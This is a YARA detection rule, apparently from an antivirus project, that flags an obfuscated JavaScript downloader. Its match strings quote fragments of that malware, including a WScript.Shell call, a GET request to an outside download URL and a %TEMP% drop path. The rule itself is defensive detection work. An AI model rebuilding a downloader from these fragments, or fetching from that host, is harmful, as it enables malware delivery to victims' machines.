rule sig_20160427_ef3dc628455fc496e6974349a26ca183 {
  meta:
    description = "datamaliciousorder - file 20160427_ef3dc628455fc496e6974349a26ca183.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "093c9eee9da997bcdd9b1505b06ea7e8af09c7155a4c2472068593f619018186"

  strings:
    $s1  = "AlrilWaglz[NgygkBwgft](\"G\" + \"ET\", \"http://soccerinsider.net/mys3ks\", false);" fullword ascii
    $s2  = "function AlyhnCmaxq() {return DdbysTecyr[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"fIeAMib" ascii
    $s3  = "function AlyhnCmaxq() {return DdbysTecyr[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"fIeAMib" ascii
    $s4  = "var DdbysTecyr = function AhbpzHnupq() {return ZvqicQiocy[ZdizpZwpes](\"WScript\"+\".Shell\");}(), GfahqMhnvz = 11;" fullword ascii
    $s5  = "function NjngpOrvkb(BkaeaLkefj, BrojdJfdpe){MmrlyMnsoq = MmrlyMnsoq * 1; return BkaeaLkefj - BrojdJfdpe;};" fullword ascii
    $s6  = "var ZvqicQiocy = this[\"WScript\"];" fullword ascii
    $s7  = "function FikxmPwmga(){return JnlikPrhul + \"\";};" fullword ascii
    $s8  = "if (AlrilWaglz[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function TuugzWwvch() {return ((ChzdhXbcls == true) && (ChzdhXbcls == EzwgyNlrzv)) ? 1 : MmrlyMnsoq;};" fullword ascii
    $s10 = "EzwgyNlrzv = true; " fullword ascii
    $s11 = "var ChzdhXbcls = false;" fullword ascii
    $s12 = "var YuqarWpvys = false;" fullword ascii
    $s13 = "return NjngpOrvkb(VggbaOqndy, KpudxXwzfp);" fullword ascii
    $s14 = "function VdahwHnqzj(){return 23;};" fullword ascii
    $s15 = "var EzwgyNlrzv = false;" fullword ascii
    $s16 = "var EgtpqTwwnc = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "ChzdhXbcls = true; " fullword ascii
    $s18 = "}while (QtwvhOfnwf);" fullword ascii
    $s19 = "function YowivDpkvu(){return ZdizpZwpes;};" fullword ascii
    $s20 = "function StbqeAezuz()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}